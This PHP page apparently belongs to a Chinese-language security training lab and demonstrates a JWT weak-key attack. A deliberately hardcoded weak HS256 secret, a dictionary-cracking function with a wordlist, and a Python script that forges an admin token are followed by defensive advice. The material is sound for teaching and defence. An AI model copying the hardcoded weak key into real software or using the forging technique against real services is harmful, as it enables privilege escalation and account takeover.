<?php
$module_name = '密钥泄露攻击';
$module_icon = '🔐';
$module_desc = '演示JWT密钥泄露和弱密钥攻击场景。';

session_start();

$message = '';
$error = '';
$success = false;
$cracked = false;

if (isset($_GET['reset'])) {
    $_SESSION['jwt_user'] = [
        'sub' => 'user123',
        'username' => 'normaluser',
        'role' => 'user',
        'iat' => time()
    ];
    $_SESSION['key_cracked'] = false;
    header('Location: 02_key_leakage.php');
    exit;
}

if (!isset($_SESSION['jwt_user'])) {
    $_SESSION['jwt_user'] = [
        'sub' => 'user123',
        'username' => 'normaluser',
        'role' => 'user',
        'iat' => time()
    ];
}

$secretKey = 'super_secret_key_12345';

$weakKeys = [
    'secret',
    'password',
    '123456',
    'secret123',
    'jwt_secret',
    'super_secret_key_12345',
    'your-256-bit-secret',
    'my_secret_key',
    'admin',
    'key'
];

function base64UrlEncode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64UrlDecode($data) {
    return base64_decode(strtr($data, '-_', '+/'));
}

function createJWT($payload, $key) {
    $header = ['alg' => 'HS256', 'typ' => 'JWT'];
    $headerEncoded = base64UrlEncode(json_encode($header));
    $payloadEncoded = base64UrlEncode(json_encode($payload));
    $signature = hash_hmac('sha256', $headerEncoded . '.' . $payloadEncoded, $key, true);
    return $headerEncoded . '.' . $payloadEncoded . '.' . base64UrlEncode($signature);
}

function verifyJWT($token, $key) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) {
        return [false, 'Invalid token format'];
    }
    
    $header = json_decode(base64UrlDecode($parts[0]), true);
    $payload = json_decode(base64UrlDecode($parts[1]), true);
    
    if (!$header || !$payload) {
        return [false, 'Invalid token structure'];
    }
    
    $expected = hash_hmac('sha256', $parts[0] . '.' . $parts[1], $key, true);
    if (hash_equals($expected, base64UrlDecode($parts[2]))) {
        return [true, $payload];
    }
    return [false, 'Invalid signature'];
}

function crackKey($token, $wordlist) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) {
        return null;
    }
    
    foreach ($wordlist as $key) {
        $expected = hash_hmac('sha256', $parts[0] . '.' . $parts[1], $key, true);
        if (hash_equals($expected, base64UrlDecode($parts[2]))) {
            return $key;
        }
    }
    return null;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['crack']) && isset($_POST['token'])) {
        $token = trim($_POST['token']);
        $crackedKey = crackKey($token, $weakKeys);
        if ($crackedKey) {
            $cracked = true;
            $message = '🎉 密钥破解成功！密钥为：<code>' . htmlspecialchars($crackedKey) . '</code>';
            $_SESSION['key_cracked'] = true;
        } else {
            $error = '破解失败：密钥不在字典中，请尝试其他方法。';
        }
    } elseif (isset($_POST['token']) && isset($_POST['key'])) {
        $token = trim($_POST['token']);
        $key = trim($_POST['key']);
        
        list($valid, $result) = verifyJWT($token, $key);
        
        if ($valid && is_array($result)) {
            $_SESSION['jwt_user'] = $result;
            if (isset($result['role']) && $result['role'] === 'admin') {
                $success = true;
                $message = '🎉 攻击成功！你已成功利用弱密钥漏洞获取管理员权限！';
            } else {
                $message = '令牌验证成功，当前用户：' . htmlspecialchars($result['username'] ?? 'unknown');
            }
        } else {
            $error = '令牌验证失败：' . htmlspecialchars($result);
        }
    }
}

$currentToken = createJWT($_SESSION['jwt_user'], $secretKey);

$content = '<div class="card">
    <div class="card-header">
        <h5 class="mb-0">🔐 密钥泄露攻击</h5>
    </div>
    <div class="card-body">
        <div class="alert alert-danger">
            <strong>💡 漏洞说明：</strong><br>
            本场景演示JWT弱密钥攻击。服务器使用了一个弱密钥进行HS256签名，攻击者可以通过字典攻击破解密钥，然后伪造任意用户的JWT令牌。
        </div>

        <div class="mb-3 text-center">
            <a href="?reset" class="btn btn-warning">重置环境</a>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🔄 攻击流程</h6>
            </div>
            <div class="card-body">
                <div class="bg-light p-3 rounded border mb-3">
                    <script src="../assets/js/mermaid.min.js"></script>
                    <div class="mermaid">
                        flowchart TD
                            A[获取JWT令牌] --> B[尝试字典攻击]
                            B --> C{密钥破解成功?}
                            C -->|是| D[获取密钥]
                            C -->|否| E[尝试其他方法]
                            D --> F[伪造管理员令牌]
                            E --> F
                            F --> G[提交伪造令牌]
                            G --> H[获取管理员权限]
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🎫 当前用户令牌</h6>
            </div>
            <div class="card-body">
                <div class="alert alert-info">
                    <strong>当前用户：</strong>' . htmlspecialchars($_SESSION['jwt_user']['username']) . '<br>
                    <strong>角色：</strong>' . htmlspecialchars($_SESSION['jwt_user']['role']) . '
                </div>
                <pre class="bg-dark text-light p-3 rounded" style="word-break: break-all;"><code>' . htmlspecialchars($currentToken) . '</code></pre>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🔧 密钥破解工具</h6>
            </div>
            <div class="card-body">
                <form method="POST">
                    <input type="hidden" name="crack" value="1">
                    <div class="mb-3">
                        <label for="token" class="form-label">输入JWT令牌进行字典攻击：</label>
                        <textarea name="token" id="token" class="form-control" rows="2" placeholder="粘贴JWT令牌...">' . htmlspecialchars($currentToken) . '</textarea>
                    </div>
                    <button type="submit" class="btn btn-danger">尝试破解密钥</button>
                </form>

                ' . ($cracked ? '<div class="alert alert-success mt-3">' . $message . '</div>' : '') . '
                ' . (!$cracked && $error && !isset($_POST['key']) ? '<div class="alert alert-danger mt-3">' . $error . '</div>' : '') . '

                <div class="mt-3">
                    <p><strong>字典列表（常见弱密钥）：</strong></p>
                    <pre class="bg-dark text-light p-3 rounded"><code>secret
password
123456
secret123
jwt_secret
your-256-bit-secret
my_secret_key
admin
key
super_secret_key_12345</code></pre>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🎯 伪造令牌</h6>
            </div>
            <div class="card-body">
                <form method="POST">
                    <div class="mb-3">
                        <label for="forged_token" class="form-label">提交伪造的JWT令牌：</label>
                        <textarea name="token" id="forged_token" class="form-control" rows="2" placeholder="粘贴你伪造的JWT令牌..."></textarea>
                    </div>
                    <div class="mb-3">
                        <label for="key" class="form-label">使用的密钥：</label>
                        <input type="text" name="key" id="key" class="form-control" placeholder="输入破解得到的密钥...">
                    </div>
                    <button type="submit" class="btn btn-danger">提交伪造令牌</button>
                </form>

                ' . ($success ? '<div class="alert alert-success mt-3">' . $message . '</div>' : '') . '
                ' . (isset($_POST['key']) && $error ? '<div class="alert alert-danger mt-3">' . $error . '</div>' : '') . '

                <div class="mt-4">
                    <h6>💡 攻击提示</h6>
                    <ol>
                        <li>使用上面的字典攻击工具破解密钥</li>
                        <li>构造新的JWT，将Payload中的role改为<strong>admin</strong></li>
                        <li>使用破解的密钥进行签名</li>
                        <li>提交伪造的令牌</li>
                    </ol>
                </div>

                <div class="mt-4">
                    <h6>🐍 Python攻击脚本</h6>
                    <pre class="bg-dark text-light p-3 rounded"><code>import jwt

# 破解得到的密钥
secret_key = "super_secret_key_12345"

# 伪造管理员令牌
payload = {
    "sub": "admin",
    "username": "attacker",
    "role": "admin",
    "iat": 1234567890
}

forged_token = jwt.encode(payload, secret_key, algorithm="HS256")
print(forged_token)</code></pre>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-header">
                <h6>🛡️ 防御建议</h6>
            </div>
            <div class="card-body">
                <ol>
                    <li><strong>使用强密钥：</strong>至少256位随机密钥</li>
                    <li><strong>密钥管理：</strong>使用环境变量或密钥管理服务</li>
                    <li><strong>定期轮换：</strong>定期更换密钥</li>
                    <li><strong>避免硬编码：</strong>不要在代码中硬编码密钥</li>
                </ol>
                <pre class="bg-dark text-light p-3 rounded"><code># 生成强密钥
openssl rand -base64 32

# 使用环境变量
$secret = getenv("JWT_SECRET");</code></pre>
            </div>
        </div>
    </div>
</div>';

include '../template/module_template.php';
?>
